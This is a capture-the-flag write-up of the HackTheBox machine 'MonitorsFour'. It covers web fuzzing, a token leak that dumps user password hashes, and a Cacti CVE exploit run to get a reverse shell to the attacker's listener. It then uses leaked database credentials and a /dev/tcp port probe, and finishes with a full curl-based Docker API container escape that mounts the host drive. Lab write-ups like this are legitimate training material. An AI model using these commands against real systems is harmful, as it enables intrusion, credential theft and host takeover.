---
title: "Monitorsfour"
date: 2026-05-28 15:40:22 +0800
categories: [HackTheBox,redteam]
tags: [Windows, Easy]
description: "Windows machine"
image:
  path: /assets/img/posts/htb/monitorsfour/monitorsfour-cover.png
  alt: "Monitorsfour"
---

### Machine info
**Link : [Monitorsfour](https://app.hackthebox.com/machines/MonitorsFour?sort_by=created_at&sort_type=desc)**

**Description : Windows machine**

**Difficulty : Easy**


1. start with nmap scan

```bash
nmap -sCV -Pn 10.129.4.20 -p-
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.49 seconds
```

2. start ffuf

```bash
ffuf -u http://monitorsfour.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

3. when direct to /contact 

maybe try with LFI 
```
Warning: include(/var/www/app/views/contact.php): Failed to open stream: No such file or directory in /var/www/app/Router.php on line 110

Warning: include(): Failed opening '/var/www/app/views/contact.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/app/Router.php on line 110
```


fuff for vhost 
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -fc 302 
```


4. when direct to /user i see thr is error shown 

![Monitorsfour screenshot 1](/assets/img/posts/htb/monitorsfour/monitorsfour-1.png)

so basically we need pass like http://monitorsfour.htb/user?token=smtg 
I got try with post method but post method is not allowed .

5. then i try to bruteforce i found it works when token = 0

i bruteforce using GenericSQLi.txt from seclist , is on this dir  /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
![Monitorsfour screenshot 2](/assets/img/posts/htb/monitorsfour/monitorsfour-2.png)

6. now we dump out the things when we http://monitorsfour.htb/user?token=0
```
[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
```

7. crack the password hash 
![Monitorsfour screenshot 3](/assets/img/posts/htb/monitorsfour/monitorsfour-3.png)


```password 
wonderful1
```


8. then i login as admin and get stuck until i ask for hint from gemini it keep on call me  ffuf the vhost . then i realise i miss smtg cuz it is nginx thus it will always return status code 302 so actually i need to filter the response based on the response size . 

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -fs 138
```

![Monitorsfour screenshot 4](/assets/img/posts/htb/monitorsfour/monitorsfour-4.png)

now add cacti.monitorsfour.htb into /etc/hosts 

9. now i get stuck on the login page then same ask for hint . lol stupid things 

the cred is 

```
username : marcus
password : wonderful1
```

10. then we also can see that cactus version 

![Monitorsfour screenshot 5](/assets/img/posts/htb/monitorsfour/monitorsfour-5.png)

search for realted cve 
the one i use is https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC


11. run the script and set up listener u will get a reverse shell 

```bash
python3 exploit.py -u marcus -p wonderful1 -i 10.10.15.92 -l 8090 -url http://cacti.monitorsfour.htb
```

12. then redirect to the to /home/marcus dir and will get user flag 

```
97e797176d4b120d12410c5760aacbfd
```

13. now are doing some enumeration cuz i found a config.php file in dir /var/www/html/cacti/include

this shown the app got connect with the database 
```
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'mariadb';
$database_username = 'cactidbuser';
$database_password = '7pyrf6ly8qx4';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
$database_persist  = false;
```


next we need check our ip route 

![Monitorsfour screenshot 6](/assets/img/posts/htb/monitorsfour/monitorsfour-6.png)

so now we are in container so our ip is 172.18.0.3 and our gateway is 172.18.0.1

thus we can check wat service is running by our gateway 

we can verify by running this 
```
for port in 80 2375 3306 5985; do (echo > /dev/tcp/172.18.0.1/$port) >/dev/null 2>&1 && echo "Port $port is OPEN" || echo "Port $port is closed"; done
```

![Monitorsfour screenshot 7](/assets/img/posts/htb/monitorsfour/monitorsfour-7.png)

```bash
mysql -h 172.18.0.1 -P 3306 -u cactidbuser -p'7pyrf6ly8qx4' -e "SHOW TABLES FROM information_schema;"

mysql -h 172.18.0.1 -P 3306 -u cactidbuser -p'7pyrf6ly8qx4' -e "SHOW TABLES FROM cacti;"
```


```bash
mysql -h 172.18.0.1 -P 3306 -u cactidbuser -p'7pyrf6ly8qx4' -e "SELECT * FROM information_schema.USER_PRIVILEGES;"
```

14. so we need to do docker escape 
![Monitorsfour screenshot 8](/assets/img/posts/htb/monitorsfour/monitorsfour-8.png)

from the change log we know it is using docker desktop 4.44.2 
and here is the related cve
https://github.com/zenzue/CVE-2025-9074

15. but we can't use python3 on the machine so we will exploit manually 

at first 

we run this to check for the image 

```bash
curl -s http://192.168.65.7:2375/images/json
```

```
www-data@821fbd6a43fa:~/html/cacti$ curl -s http://192.168.65.7:2375/images/json
<cacti$ curl -s http://192.168.65.7:2375/images/json
[{"Containers":1,"Created":1762794130,"Id":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","Labels":{"com.docker.compose.project":"docker_setup","com.docker.compose.service":"nginx-php","com.docker.compose.version":"2.39.1"},"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","size":856},"RepoDigests":["docker_setup-nginx-php@sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666"],"RepoTags":["docker_setup-nginx-php:latest"],"SharedSize":-1,"Size":1277167255},{"Containers":1,"Created":1762791053,"Id":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","Labels":{"com.docker.compose.project":"docker_setup","com.docker.compose.service":"mariadb","com.docker.compose.version":"2.39.1","org.opencontainers.image.authors":"MariaDB Community","org.opencontainers.image.base.name":"docker.io/library/ubuntu:noble","org.opencontainers.image.description":"MariaDB Database for relational SQL","org.opencontainers.image.documentation":"https://hub.docker.com/_/mariadb/","org.opencontainers.image.licenses":"GPL-2.0","org.opencontainers.image.ref.name":"ubuntu","org.opencontainers.image.source":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.title":"MariaDB Database","org.opencontainers.image.url":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.vendor":"MariaDB Community","org.opencontainers.image.version":"11.4.8"},"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","size":856},"RepoDigests":["docker_setup-mariadb@sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40"],"RepoTags":["docker_setup-mariadb:latest"],"SharedSize":-1,"Size":454269972},{"Containers":0,"Created":1759921496,"Id":"sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412","Labels":null,"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412","size":9218},"RepoDigests":["alpine@sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412"],"RepoTags":["alpine:latest"],"SharedSize":-1,"Size":12794775}]
```


next query the docker api endpoint to create a new container name root_escape and also mount the drive and read the root flag 

```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"Image":"alpine:latest","Cmd":["cat","/host_root/Users/Administrator/Desktop/root.txt"],"HostConfig":{"Binds":["/run/desktop/mnt/host/c:/host_root"]}}' http://192.168.65.7:2375/containers/create?name=root_escape
```

next we start the container 

```bash
 curl -s -X POST http://192.168.65.7:2375/containers/root_escape/start
```


read the output via this endpoints
```bash
curl -s "http://192.168.65.7:2375/containers/root_escape/logs?stdout=true"
```

```root flag
3d6f408573999de36bab13622eb237b1
```

![Monitorsfour screenshot 9](/assets/img/posts/htb/monitorsfour/Monitorsfour-result.png)

hard first time playing with docker escape 